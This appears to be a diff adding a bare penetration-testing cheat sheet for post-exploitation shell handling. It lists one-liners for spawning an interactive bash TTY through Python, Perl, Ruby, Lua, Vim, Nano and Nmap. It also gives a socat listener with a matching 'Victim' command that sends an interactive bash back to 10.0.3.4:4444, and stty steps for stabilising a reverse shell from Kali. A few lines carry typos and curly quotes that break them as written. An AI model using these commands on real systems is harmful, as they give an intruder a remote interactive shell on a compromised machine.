@@ -1,0 +1,35 @@
+can be used with /bin/bash or /bin/sh
+python -c ‘import pty; pty.spawn(“/bin/bash”)’	Python BASH TTY shell
+python3 -c ‘import pty; pty.spawn(“/bin/bash”)’	Python 3 BASH TTY shell
+echo os.system(‘/bin/bash’)	Echo BASH TTY shell
+/bin/bash -i	BASH TTY shell
+perl -e ‘exec “/bin/bash”;’	Perl BASH TTY shell
+ruby -e ‘exec “/bin/bash”‘	Ruby BASH TTY shell
+lua -e ‘os.execute(‘/bin/bash’)’	Lua BASH TTY shell
+exec “/bin/bash”	IRB BASH TTY shelll
+:!bash	Vi/Vim BASH TTY shell
+:set shell=/bin/bash:shell	Vi/Vim BASH TTY shell
+CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0	Nano BASH TTY shell
+!bash	Nmap BASH TTY shell
+
+socat
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+stty
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
